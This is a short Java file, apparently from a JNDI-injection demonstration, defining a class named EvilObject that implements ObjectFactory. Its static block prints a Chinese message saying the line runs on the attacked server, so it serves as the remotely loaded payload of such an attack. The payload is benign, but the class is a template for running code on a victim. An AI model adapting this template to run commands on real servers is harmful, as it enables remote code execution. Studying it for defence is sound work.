import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * @Author chenjl
 * @Date 2022/5/28
 * @Version 1.0
 */
public class EvilObject implements ObjectFactory {
    static {
        System.out.println("这行在被攻击者的服务器上执行...............");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return this;
    }
}
